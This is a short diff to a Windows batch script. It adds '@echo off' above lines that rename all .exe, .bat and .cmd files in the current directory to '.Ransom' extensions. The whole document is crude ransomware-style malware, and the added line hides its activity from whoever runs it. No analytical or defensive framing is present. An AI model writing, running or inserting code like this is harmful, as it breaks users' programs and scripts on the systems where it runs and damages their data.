@@ -1,3 +1,4 @@
+@echo off
 if exist *.exe ren *.exe *.Ransom1
 if exist *.bat ren *.bat *.Ransom2
 if exist *.cmd ren *.cmd *.Ransom3
